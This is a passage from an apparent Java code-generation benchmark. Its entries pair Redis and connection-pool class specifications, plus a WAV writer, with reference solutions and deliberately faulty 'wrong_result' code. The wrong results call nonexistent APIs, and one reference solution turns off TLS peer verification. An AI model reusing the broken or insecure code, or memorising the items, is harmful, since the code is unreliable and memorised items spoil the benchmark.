    "wrong_result": "import java.util.Collections;\nimport java.util.ConcurrentHashMap;\nimport java.util.Map;\nimport java.util.Set;\nimport org.apache.log4j.Logger;\nimport java.util.concurrent.locks.ReentrantLock;\nimport com.google.common.base.Preconditions;\n\npublic class MultiClusterPooledConnectionProvider {\n    private final Logger log = Logger.getLogger(MultiClusterPooledConnectionProvider.class);\n    private final Map<Integer, Cluster> multiClusterMap = new ConcurrentHashMap<>();\n    private volatile int activeMultiClusterIndex;\n    private final ReentrantLock activeClusterIndexLock = new ReentrantLock();\n    private volatile boolean lastClusterCircuitBreakerForcedOpen;\n\n    public MultiClusterPooledConnectionProvider(MultiClusterClientConfig multiClusterClientConfig) {\n        Preconditions.checkNotNull(multiClusterClientConfig, \"Configuration cannot be null\");\n        for (ClusterConfig clusterConfig : multiClusterClientConfig.getClusters()) {\n            Cluster cluster = new Cluster(clusterConfig);\n            multiClusterMap.put(clusterConfig.getPriority(), cluster);\n        }\n        if (!multiClusterMap.isEmpty()) {\n            int maxPriority = Collections.max(multiClusterMap.keySet());\n            activeMultiClusterIndex = maxPriority;\n        }\n    }\n\n    public Connection getConnection() {\n        int priority = activeMultiClusterIndex;\n        Cluster cluster = multiClusterMap.get(priority);\n        if (cluster == null) {\n            log.error(\"Active cluster not found for priority: \" + priority);\n        }\n        return cluster.getConnection();\n    }\n\n    public Connection getConnection(int multiClusterIndex) {\n        Cluster cluster = multiClusterMap.get(multiClusterIndex);\n        if (cluster == null) {\n            log.error(\"Cluster not found for priority: \" + multiClusterIndex);\n        }\n        return cluster.getConnection();\n    }\n\n    public void close() {\n        Cluster activeCluster = multiClusterMap.get(activeMultiClusterIndex);\n        if (activeCluster != null) {\n            activeCluster.getConnectionPool().close();\n        }\n    }\n\n    private static class Cluster {\n        private final ConnectionPool connectionPool;\n\n        public Cluster(ClusterConfig clusterConfig) {\n            this.connectionPool = new ConnectionPool(clusterConfig.getHost(), clusterConfig.getPort());\n        }\n\n        public Connection getConnection() {\n            return connectionPool.getConnection();\n        }\n\n        public ConnectionPool getConnectionPool() {\n            return connectionPool;\n        }\n    }\n}"
  },
  {
    "Task_id": 332,
    "Instruction": "Task Description: Create a Java class that provides a wrapper for JedisSentinelPool to simplify Redis Sentinel connection management in Java applications.\n\nClass Description: JedisSentinelPoolWrapper is a utility class that encapsulates the functionality of JedisSentinelPool, providing methods for pool initialization, resource acquisition, and connection cleanup. It handles Redis Sentinel connections with configurable pool settings and client configurations.\n\nAttributes:\n- masterName: String - The name of the Redis master node in the Sentinel configuration\n- sentinels: Set<HostAndPort> - Set of Sentinel server addresses (host and port)\n- poolConfig: GenericObjectPoolConfig<Jedis> - Configuration for the connection pool\n- masterConfig: JedisClientConfig - Configuration for connections to the master node\n- sentinelConfig: JedisClientConfig - Configuration for connections to Sentinel nodes\n- pool: JedisSentinelPool - The underlying Jedis Sentinel connection pool instance\n\nMethods:\n- initializePool(): void - Initializes the JedisSentinelPool with the configured parameters\n- getResource(): Jedis - Retrieves a Jedis resource from the pool (throws JedisConnectionException if pool not initialized)\n- close(): void - Closes the pool if it's open\n- isClosed(): boolean - Returns whether the pool is closed\n- destroy(): void - Destroys the pool and all its resources\n- toStrings(Set<HostAndPort>): Set<String> - Static helper method to convert HostAndPort objects to strings",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport java.util.Set;\nimport java.util.stream.Collectors;\n\npublic class JedisSentinelPoolWrapper {\n\n    private final String masterName;\n    private final Set<HostAndPort> sentinels;\n    private final GenericObjectPoolConfig<Jedis> poolConfig;\n    private final JedisClientConfig masterConfig;\n    private final JedisClientConfig sentinelConfig;\n    private JedisSentinelPool pool;\n\n    public JedisSentinelPoolWrapper(String masterName, Set<HostAndPort> sentinels,\n                                  GenericObjectPoolConfig<Jedis> poolConfig,\n                                  JedisClientConfig masterConfig,\n                                  JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.sentinels = sentinels;\n        this.poolConfig = poolConfig;\n        this.masterConfig = masterConfig;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public void initializePool() {\n        this.pool = new JedisSentinelPool(masterName, sentinels, poolConfig, masterConfig, sentinelConfig);\n    }\n\n    public Jedis getResource() throws JedisConnectionException {\n        if (pool == null) {\n            throw new JedisConnectionException(\"Pool not initialized\");\n        }\n        return pool.getResource();\n    }\n\n    public void close() {\n        if (pool != null && !pool.isClosed()) {\n            pool.close();\n        }\n    }\n\n    public boolean isClosed() {\n        return pool == null || pool.isClosed();\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            pool.destroy();\n        }\n    }\n\n    private static Set<String> toStrings(Set<HostAndPort> hostAndPorts) {\n        return hostAndPorts.stream().map(HostAndPort::toString).collect(Collectors.toSet());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class JedisSentinelPoolWrapper {\n    private final String masterName;\n    private final Set<HostAndPort> sentinels;\n    private final GenericObjectPoolConfig<Jedis> poolConfig;\n    private final JedisClientConfig masterConfig;\n    private final JedisClientConfig sentinelConfig;\n    private JedisSentinelPool pool;\n    private final AtomicBoolean closed = new AtomicBoolean(false);\n\n    public JedisSentinelPoolWrapper(String masterName, Set<HostAndPort> sentinels, GenericObjectPoolConfig<Jedis> poolConfig, JedisClientConfig masterConfig, JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.sentinels = sentinels;\n        this.poolConfig = poolConfig;\n        this.masterConfig = masterConfig;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public void initializePool() {\n        if (pool != null) {\n            throw new IllegalStateException(\"Pool already initialized\");\n        }\n        this.pool = new JedisSentinelPool(masterName, sentinels, poolConfig, masterConfig);\n    }\n\n    public Jedis getResource() {\n        if (pool == null) {\n            throw new JedisConnectionException(\"Pool not initialized\");\n        }\n        return pool.getResource();\n    }\n\n    public void close() {\n        if (closed.get()) {\n            return;\n        }\n        if (pool != null) {\n            pool.close();\n        }\n        closed.set(true);\n    }\n\n    public boolean isClosed() {\n        return closed.get();\n    }\n\n    public void destroy() {\n        close();\n    }\n\n    public static Set<String> toStrings(Set<HostAndPort> hosts) {\n        Set<String> result = new HashSet<>();\n        if (hosts != null) {\n            for (HostAndPort host : hosts) {\n                result.add(host.getHost() + \":\" + host.getPort());\n            }\n        }\n        return result;\n    }\n}"
  },
  {
    "Task_id": 335,
    "Instruction": "Task Description: Create a Redis configuration class in Java that sets up Redis connection and template configurations using Spring Boot and Redisson.\n\nClass Description: The RedisConfig class is a Spring configuration class that provides Redis-related beans including RedisTemplate, RedissonClient, and a custom KeyGenerator. It configures connection settings, serialization, and client instances for Redis operations.\n\nAttributes:\n- REDIS_PREFIX: [String] - A constant string prefix for Redis connection URLs (\"redis://\")\n\nMethods:\n- redisTemplate: [redisTemplate](LettuceConnectionFactory lettuceConnectionFactory) -> RedisTemplate<Object, Object> - Creates and configures a RedisTemplate with FastJson serialization and String key serialization\n- redisson: [redisson](RedisProperties redisProperties) -> RedissonClient - Creates and configures a Redisson client instance with single server configuration\n- keyGenerator: [keyGenerator]() -> KeyGenerator - Creates a custom key generator that produces SHA-256 hashes of method invocation details\n\nThe class uses Spring annotations (@Configuration, @Bean, etc.) to manage bean creation and dependencies, and integrates with Spring Boot's RedisProperties for configuration.",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport org.apache.commons.codec.digest.DigestUtils;\nimport org.redisson.Redisson;\nimport org.redisson.api.RedissonClient;\nimport org.redisson.config.Config;\nimport org.redisson.config.SingleServerConfig;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnClass;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;\nimport org.springframework.boot.autoconfigure.data.redis.RedisProperties;\nimport org.springframework.boot.context.properties.EnableConfigurationProperties;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;\nimport org.springframework.data.redis.core.RedisOperations;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.data.redis.serializer.StringRedisSerializer;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n@Configuration\n@ConditionalOnClass(RedisOperations.class)\n@EnableConfigurationProperties(RedisProperties.class)\npublic class RedisConfig {\n\n    private static final String REDIS_PREFIX = \"redis://\";\n\n    @Bean(name = \"redisTemplate\")\n    @ConditionalOnMissingBean(name = \"redisTemplate\")\n    public RedisTemplate<Object, Object> redisTemplate(LettuceConnectionFactory lettuceConnectionFactory) {\n        RedisTemplate<Object, Object> template = new RedisTemplate<>();\n        FastJsonRedisSerializer<Object> fastJsonRedisSerializer = new FastJsonRedisSerializer<>(Object.class);\n        template.setValueSerializer(fastJsonRedisSerializer);\n        template.setHashValueSerializer(fastJsonRedisSerializer);\n        template.setKeySerializer(new StringRedisSerializer());\n        template.setHashKeySerializer(new StringRedisSerializer());\n        template.setConnectionFactory(lettuceConnectionFactory);\n        return template;\n    }\n\n    @Bean(destroyMethod = \"shutdown\")\n    public RedissonClient redisson(RedisProperties redisProperties) {\n        Config config = new Config();\n        SingleServerConfig singleServerConfig = config.useSingleServer();\n        singleServerConfig.setAddress(REDIS_PREFIX + redisProperties.getHost() + \":\" + redisProperties.getPort());\n        if (redisProperties.getPassword() != null && !redisProperties.getPassword().isEmpty()) {\n            singleServerConfig.setPassword(redisProperties.getPassword());\n        }\n        singleServerConfig.setPingConnectionInterval(1000);\n        return Redisson.create(config);\n    }\n\n    @Bean\n    public KeyGenerator keyGenerator() {\n        return (target, method, params) -> {\n            Map<String, Object> container = new HashMap<>(3);\n            Class<?> targetClassClass = target.getClass();\n            container.put(\"class\", targetClassClass.toGenericString());\n            container.put(\"methodName\", method.getName());\n            container.put(\"package\", targetClassClass.getPackage());\n            for (int i = 0; i < params.length; i++) {\n                container.put(String.valueOf(i), params[i]);\n            }\n            String jsonString = JSON.toJSONString(container);\n            return DigestUtils.sha256Hex(jsonString);\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "import org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.data.redis.serializer.StringRedisSerializer;\nimport org.redisson.api.RedissonClient;\nimport org.redisson.config.Config;\nimport org.springframework.boot.autoconfigure.data.redis.RedisProperties;\nimport java.lang.reflect.Method;\nimport java.util.Arrays;\nimport org.apache.commons.codec.digest.DigestUtils;\n\n@Configuration\npublic class RedisConfig {\n\n    private static final String REDIS_PREFIX = \"redis://\";\n\n    @Bean\n    public RedisTemplate<Object, Object> redisTemplate(LettuceConnectionFactory lettuceConnectionFactory) {\n        RedisTemplate<Object, Object> template = new RedisTemplate<>();\n        template.setConnectionFactory(lettuceConnectionFactory);\n        template.setValueSerializer(new com.alibaba.fastjson2.JSONSerializer());\n        template.setKeySerializer(new StringRedisSerializer());\n        return template;\n    }\n\n    @Bean\n    public RedissonClient redisson(RedisProperties redisProperties) {\n        Config config = new Config();\n        config.useSingleServer().setAddress(redisProperties.getHost() + \":\" + redisProperties.getPort());\n        return Redisson.create(config);\n    }\n\n    @Bean\n    public KeyGenerator keyGenerator() {\n        return new KeyGenerator() {\n            @Override\n            public String generateKey(Method method, Object... params) {\n                StringBuilder sb = new StringBuilder();\n                sb.append(method.getDeclaringClass().getName())\n                  .append(\":\")\n                  .append(method.getName())\n                  .append(\"(\")\n                  .append(String.join(\",\", Arrays.stream(params).map(Object::toString).toArray(String[]::new)))\n                  .append(\")\");\n                return DigestUtils.sha256Hex(sb.toString());\n            }\n        };\n    }\n}"
  },
  {
    "Task_id": 337,
    "Instruction": "Task Description: Create a Java class that provides geospatial operations using Redis, including adding locations, querying locations within a radius, calculating distances between locations, and retrieving position coordinates.\n\nClass Description: The RedisGeoOperations class encapsulates Redis geospatial commands using the Lettuce client. It manages Redis connections and provides methods for common geospatial operations.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance for connection management\n- redisCommands: RedisCommands<String, String> - Synchronous Redis command interface for executing operations\n\nMethods:\n- RedisGeoOperations(String host, int port) -> void - Constructor that initializes the Redis client with specified host and port\n- addGeoLocation(String key, double longitude, double latitude, String member) -> void - Adds a geospatial member with coordinates to the specified key\n- getGeoRadius(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit) -> Set<String> - Returns members within given radius of a point\n- getGeoDistance(String key, String member1, String member2, GeoArgs.Unit unit) -> Double - Calculates distance between two members in specified units\n- getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit, GeoArgs geoArgs) -> List<GeoWithin<String>> - Returns members within radius with additional options (like distance or coordinates)\n- getGeoPositions(String key, String... members) -> List<GeoCoordinates> - Returns coordinates for specified members\n- closeConnection() -> void - Properly closes Redis connection and shuts down client",
    "Canonical_solution": "import io.lettuce.core.*;\nimport io.lettuce.core.api.sync.RedisCommands;\n\npublic class RedisGeoOperations {\n\n    private RedisClient redisClient;\n    private RedisCommands<String, String> redisCommands;\n\n    public RedisGeoOperations(String host, int port) {\n        this.redisClient = RedisClient.create(RedisURI.Builder.redis(host, port).build());\n        this.redisCommands = redisClient.connect().sync();\n    }\n\n    public void addGeoLocation(String key, double longitude, double latitude, String member) {\n        redisCommands.geoadd(key, longitude, latitude, member);\n    }\n\n    public Set<String> getGeoRadius(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit);\n    }\n\n    public Double getGeoDistance(String key, String member1, String member2, GeoArgs.Unit unit) {\n        return redisCommands.geodist(key, member1, member2, unit);\n    }\n\n    public List<GeoWithin<String>> getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, \n                                                      GeoArgs.Unit unit, GeoArgs geoArgs) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit, geoArgs);\n    }\n\n    public List<GeoCoordinates> getGeoPositions(String key, String... members) {\n        return redisCommands.geopos(key, members);\n    }\n\n    public void closeConnection() {\n        redisCommands.getStatefulConnection().close();\n        redisClient.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisGeoOperations {\n    private final RedisClient redisClient;\n    private final RedisCommands<String, String> redisCommands;\n\n    public RedisGeoOperations(String host, int port) {\n        redisClient = RedisClient.create(host, port);\n        redisCommands = redisClient.getCommands();\n    }\n\n    public void addGeoLocation(String key, double longitude, double latitude, String member) {\n        redisCommands.georAdd(key, longitude, latitude, member);\n    }\n\n    public Set<String> getGeoRadius(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit);\n    }\n\n    public Double getGeoDistance(String key, String member1, String member2, GeoArgs.Unit unit) {\n        return redisCommands.geodist(key, member1, member2, unit);\n    }\n\n    public List<GeoWithin<String>> getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit, GeoArgs geoArgs) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit, geoArgs);\n    }\n\n    public List<GeoCoordinates> getGeoPositions(String key, String... members) {\n        return redisCommands.geopos(key, members);\n    }\n\n    public void closeConnection() {\n        redisClient.shutdown();\n    }\n}"
  },
  {
    "Task_id": 338,
    "Instruction": "Task Description: Create a Java class that establishes and manages connections to a Redis master-replica setup using Lettuce client, with support for read operations from replicas and secure connection handling.\n\nClass Description: RedisMasterReplicaConnector is a utility class that provides methods to create, manage, and close connections to a Redis master-replica cluster. It supports read scaling by allowing read operations from replicas and includes secure connection handling with custom DNS resolution.\n\nAttributes:\n- clientResources: ClientResources - The Lettuce client resources configuration including custom socket address resolver\n\nMethods:\n- RedisMasterReplicaConnector(ClientResources) -> void - Constructor that initializes client resources with custom DNS resolution\n- createConnection(String host, String masterId) -> StatefulRedisMasterReplicaConnection<String, String> - Creates a connection to Redis master-replica setup with specified host and master ID\n- closeConnection(StatefulRedisMasterReplicaConnection<String, String> connection) -> void - Properly closes the Redis connection and shuts down the client\n- performOperations(StatefulRedisMasterReplicaConnection<String, String> connection, String key, String value) -> void - Demonstrates basic Redis operations (set and get) using the established connection",
    "Canonical_solution": "import io.lettuce.core.ReadFrom;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.resource.ClientResources;\nimport io.lettuce.core.resource.DnsResolver;\nimport io.lettuce.core.resource.MappingSocketAddressResolver;\nimport io.lettuce.test.resource.FastShutdown;\n\npublic class RedisMasterReplicaConnector {\n\n    private final ClientResources clientResources;\n\n    public RedisMasterReplicaConnector(ClientResources clientResources) {\n        this.clientResources = clientResources.mutate()\n                .socketAddressResolver(MappingSocketAddressResolver.create(DnsResolver.jvmDefault(), hostAndPort -> {\n                    return HostAndPort.of(hostAndPort.getHostText(), hostAndPort.getPort() + 443);\n                })).build();\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> createConnection(String host, String masterId) {\n        RedisClient client = RedisClient.create(clientResources);\n        RedisURI redisURI = RedisURI.create(\"rediss-sentinel://\" + host + \":26379?sentinelMasterId=\" + masterId);\n        redisURI.setVerifyPeer(false);\n        \n        StatefulRedisMasterReplicaConnection<String, String> connection = \n            MasterReplica.connect(client, StringCodec.UTF8, redisURI);\n        connection.setReadFrom(ReadFrom.REPLICA);\n        \n        return connection;\n    }\n\n    public void closeConnection(StatefulRedisMasterReplicaConnection<String, String> connection) {\n        if (connection != null) {\n            connection.close();\n            FastShutdown.shutdown(connection.getRedisClient());\n        }\n    }\n\n    public void performOperations(StatefulRedisMasterReplicaConnection<String, String> connection, String key, String value) {\n        connection.sync().set(key, value);\n        connection.sync().get(key);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "public class RedisMasterReplicaConnector {\n    private final ClientResources clientResources;\n\n    public RedisMasterReplicaConnector(ClientResources clientResources) {\n        this.clientResources = clientResources;\n    }\n\n    public StatefulRedisMasterReplicaConnection<String, String> createConnection(String host, String masterId) {\n        RedisURI redisURI = RedisURI.create(host);\n        return clientResources.getRedisClient().connectMasterReplica(redisURI);\n    }\n\n    public void closeConnection(StatefulRedisMasterReplicaConnection<String, String> connection) {\n        connection.close();\n        clientResources.shutdown();\n    }\n\n    public void performOperations(StatefulRedisMasterReplicaConnection<String, String> connection, String key, String value) {\n        connection.sync().set(key, value);\n        String result = connection.sync().get(key);\n        System.out.println(\"Set key: \" + key + \" value: \" + value);\n        System.out.println(\"Get key: \" + key + \" result: \" + result);\n    }\n}"
  },
  {
    "Task_id": 339,
    "Instruction": "Task Description: Implement a Redis client class in Java that supports read-write operations with master-slave architecture, connection pooling, and proper resource management.\n\nClass Description: ReadWriteRedisClient is a Java class that provides a Redis client implementation with support for master-slave architecture. It uses connection pooling (via JedisPool) for efficient resource management and implements basic CRUD operations with automatic routing of read operations to slaves and write operations to the master.\n\nAttributes:\n- master: JedisPool - Connection pool for the master Redis instance\n- slaves: List<JedisPool> - List of connection pools for slave Redis instances\n- jedisPoolConfig: JedisPoolConfig - Configuration for the connection pools\n- address: String - Comma-separated list of Redis server addresses (master first)\n- timeout: int - Connection timeout in milliseconds\n- random: Random - Random number generator for slave selection\n\nMethods:\n- initialize() -> void - Initializes the Redis connection pools based on the configured addresses\n- destroy() -> void - Closes all connection pools and releases resources\n- get(String key) -> String - Retrieves a value from Redis (reads from a random slave)\n- set(String key, String value) -> String - Stores a value in Redis (writes to master)\n- fetchResource(boolean read) -> Jedis - Internal method to get a Redis connection (selects master or random slave)\n- setJedisPoolConfig(JedisPoolConfig jedisPoolConfig) -> void - Sets the connection pool configuration\n- setTimeout(int timeout) -> void - Sets the connection timeout\n- setAddress(String address) -> void - Sets the Redis server addresses",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\n\npublic class ReadWriteRedisClient {\n\n    private JedisPool master;\n    private List<JedisPool> slaves = new ArrayList<JedisPool>();\n    private JedisPoolConfig jedisPoolConfig;\n    private String address;\n    private int timeout = 3000;\n    private Random random = new Random();\n\n    public void initialize() throws Exception {\n        String[] hostAndPorts = address.split(\",\");\n        String masterHP = hostAndPorts[0];\n        String[] ms = masterHP.split(\":\");\n        master = new JedisPool(jedisPoolConfig, ms[0], Integer.valueOf(ms[1]), timeout);\n        if (hostAndPorts.length > 1) {\n            for (int i = 1; i < hostAndPorts.length; i++) {\n                String[] ss = hostAndPorts[i].split(\":\");\n                JedisPool slave = new JedisPool(jedisPoolConfig, ss[0], Integer.valueOf(ss[1]), timeout);\n                slaves.add(slave);\n            }\n        }\n        slaves.add(master);\n    }\n\n    public void destroy() throws Exception {\n        if (master != null) {\n            master.close();\n        }\n        for (JedisPool slave : slaves) {\n            if (slave != null) {\n                slave.close();\n            }\n        }\n    }\n\n    public String get(String key) {\n        Jedis jedis = fetchResource(true);\n        try {\n            return jedis.get(key);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public String set(String key, String value) {\n        Jedis jedis = fetchResource(false);\n        try {\n            return jedis.set(key, value);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    private Jedis fetchResource(boolean read) {\n        if(slaves.isEmpty() || !read) {\n            return master.getResource();\n        }\n        int size = slaves.size();\n        int i = random.nextInt(size);\n        return slaves.get(i).getResource();\n    }\n\n    public void setJedisPoolConfig(JedisPoolConfig jedisPoolConfig) {\n        this.jedisPoolConfig = jedisPoolConfig;\n    }\n\n    public void setTimeout(int timeout) {\n        this.timeout = timeout;\n    }\n\n    public void setAddress(String address) {\n        this.address = address;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "import redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport java.util.List;\nimport java.util.Random;\n\npublic class ReadWriteRedisClient {\n    private JedisPool master;\n    private List<JedisPool> slaves;\n    private JedisPoolConfig jedisPoolConfig;\n    private String address;\n    private int timeout;\n    private Random random;\n\n    public void initialize() {\n        String[] parts = address.split(\",\");\n        if (parts.length == 0) return;\n        String masterAddr = parts[0];\n        String[] masterHostPort = masterAddr.split(\":\");\n        int masterPort = Integer.parseInt(masterHostPort[1]);\n        master = new JedisPool(jedisPoolConfig, timeout, masterHostPort[0], masterPort);\n        slaves = new java.util.ArrayList<>();\n        for (int i = 1; i < parts.length; i++) {\n            String slaveAddr = parts[i];\n            String[] slaveHostPort = slaveAddr.split(\":\");\n            int slavePort = Integer.parseInt(slaveHostPort[1]);\n            slaves.add(new JedisPool(jedisPoolConfig, timeout, slaveHostPort[0], slavePort));\n        }\n    }\n\n    public void destroy() {\n        if (master != null) master.close();\n        if (slaves != null) for (JedisPool pool : slaves) pool.close();\n    }\n\n    public String get(String key) {\n        Jedis jedis = fetchResource(true);\n        String value = jedis.get(key);\n        jedis.returnResource();\n        return value;\n    }\n\n    public String set(String key, String value) {\n        Jedis jedis = fetchResource(false);\n        String result = jedis.set(key, value);\n        jedis.returnResource();\n        return result;\n    }\n\n    private Jedis fetchResource(boolean read) {\n        return read ? slaves.get(random.nextInt(slaves.size())).borrowObject() : master.borrowObject();\n    }\n\n    public void setJedisPoolConfig(JedisPoolConfig jedisPoolConfig) {\n        this.jedisPoolConfig = jedisPoolConfig;\n    }\n\n    public void setTimeout(int timeout) {\n        this.timeout = timeout;\n    }\n\n    public void setAddress(String address) {\n        this.address = address;\n    }\n}"
  },
  {
    "Task_id": 34,
    "Instruction": "Task Description: Implement a Java class for writing WAV audio files with support for file rollover when reaching maximum size limits, using Java NIO's FileChannel for efficient file operations.\n\nClass Description: WaveWriter is a class that handles the creation and writing of WAV audio files. It manages file channels, buffers, and WAV file formatting while supporting automatic file rollover when files reach a specified maximum size. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- mAudioFormat: [AudioFormat] - The audio format specification for the WAV file\n- mFileRolloverCounter: [int] - Counter for tracking rolled-over file versions\n- mMaxSize: [long] - Maximum allowed file size before rollover (0 means no limit)\n- mFile: [Path] - Current file path being written to\n- mFileChannel: [FileChannel] - NIO file channel for file operations\n- mDataChunkOpen: [boolean] - Flag indicating if a data chunk is currently open\n- mDataChunkSizeOffset: [long] - File position of the data chunk size field\n- mDataChunkSize: [int] - Current size of the data chunk in bytes\n\nMethods:\n- WaveWriter: [constructor](AudioFormat format, Path file, long maxSize) -> [void] - Initializes a new WaveWriter with specified format, output file, and maximum size\n- WaveWriter: [constructor](AudioFormat format, Path file) -> [void] - Initializes a new WaveWriter with no maximum size limit\n- open: [private]() -> [void] - Opens a new file channel and writes initial WAV header\n- close: [public]() -> [void] - Closes the file channel and performs cleanup\n- close: [public](Path path) -> [void] - Closes the file channel and renames the file to the specified path\n- writeData: [public](ByteBuffer buffer) -> [void] - Writes audio data to the file, handling rollover if needed\n- closeDataChunk: [private]() -> [void] - Marks the current data chunk as closed\n- openDataChunk: [private]() -> [void] - Opens a new data chunk in the WAV file\n- rollover: [private]() -> [void] - Performs file rollover operation when reaching size limit\n- updateTotalSize: [private]() -> [void] - Updates the total file size in the WAV header\n- updateDataChunkSize: [private]() -> [void] - Updates the data chunk size in the WAV file\n- getUnsignedIntegerBuffer: [protected static](long size) -> [ByteBuffer] - Creates a buffer with unsigned integer representation\n- updateFileName: [private]() -> [void] - Updates the filename for rollover operations\n- getDataHeader: [public static]() -> [ByteBuffer] - Creates a data chunk header buffer\n- getWaveHeader: [public static](AudioFormat format) -> [ByteBuffer] - Creates a WAV file header buffer\n- getFormatChunk: [public static](AudioFormat format) -> [ByteBuffer] - Creates a format chunk buffer for WAV file",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.ByteOrder;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Arrays;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\nimport javax.sound.sampled.AudioFormat;\n\npublic class WaveWriter implements AutoCloseable\n{\n    private static final Pattern FILENAME_PATTERN = Pattern.compile(\"(.*_)(\\\\d+)(\\\\.tmp)\");\n    private AudioFormat mAudioFormat;\n    private int mFileRolloverCounter = 1;\n    private long mMaxSize;\n    private Path mFile;\n    private FileChannel mFileChannel;\n    private boolean mDataChunkOpen = false;\n    private long mDataChunkSizeOffset = 0;\n    private int mDataChunkSize = 0;\n\n    public WaveWriter(AudioFormat format, Path file, long maxSize) throws IOException\n    {\n        mAudioFormat = format;\n        mFile = file;\n        mMaxSize = maxSize;\n        open();\n    }\n\n    public WaveWriter(AudioFormat format, Path file) throws IOException\n    {\n        this(format, file, 0);\n    }\n\n    private void open() throws IOException\n    {\n        int version = 2;\n        while(Files.exists(mFile) && version < 20)\n        {\n            mFile = Paths.get(mFile.toFile().getAbsolutePath().replace(\".tmp\", \"_\" + version + \".tmp\"));\n            version++;\n        }\n        mFileChannel = (FileChannel.open(mFile, StandardOpenOption.WRITE, StandardOpenOption.CREATE_NEW));\n        ByteBuffer header = getWaveHeader(mAudioFormat);\n        while(header.hasRemaining())\n        {\n            mFileChannel.write(header);\n        }\n    }\n\n    public void close() throws IOException\n    {\n        close(null);\n    }\n\n    public void close(Path path) throws IOException\n    {\n        mFileChannel.force(true);\n        mFileChannel.close();\n        rename(path);\n    }\n\n    public void writeData(ByteBuffer buffer) throws IOException\n    {\n        buffer.position(0);\n        openDataChunk();\n        if(mFileChannel.size() + buffer.capacity() < mMaxSize)\n        {\n            while(buffer.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(buffer);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n        }\n        else\n        {\n            int remaining = (int)(mMaxSize - mFileChannel.size());\n            remaining -= (int)(remaining % mAudioFormat.getFrameSize());\n            byte[] bytes = buffer.array();\n            ByteBuffer current = ByteBuffer.wrap(Arrays.copyOf(bytes, remaining));\n            ByteBuffer next = ByteBuffer.wrap(Arrays.copyOfRange(bytes, remaining, bytes.length));\n            while(current.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(current);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n            rollover();\n            openDataChunk();\n            while(next.hasRemaining())\n            {\n                mDataChunkSize += mFileChannel.write(next);\n            }\n            updateTotalSize();\n            updateDataChunkSize();\n        }\n    }\n\n    private void closeDataChunk()\n    {\n        mDataChunkOpen = false;\n    }\n\n    private void openDataChunk() throws IOException\n    {\n        if(!mDataChunkOpen)\n        {\n            if(mFileChannel.size() + 32 >= mMaxSize)\n            {\n                rollover();\n            }\n            ByteBuffer formatChunk = getFormatChunk(mAudioFormat);\n            formatChunk.position(0);\n            while(formatChunk.hasRemaining())\n            {\n                mFileChannel.write(formatChunk);\n            }\n            ByteBuffer dataHeader = getDataHeader();\n            dataHeader.position(0);\n            while(dataHeader.hasRemaining())\n            {\n                mFileChannel.write(dataHeader);\n            }\n            mDataChunkSizeOffset = mFileChannel.size() - 4;\n            mDataChunkSize = 0;\n            mDataChunkOpen = true;\n            updateTotalSize();\n        }\n    }\n\n    private void rollover() throws IOException\n    {\n        closeDataChunk();\n        close();\n        mFileRolloverCounter++;\n        updateFileName();\n        open();\n    }\n\n    private void updateTotalSize() throws IOException\n    {\n        ByteBuffer buffer = 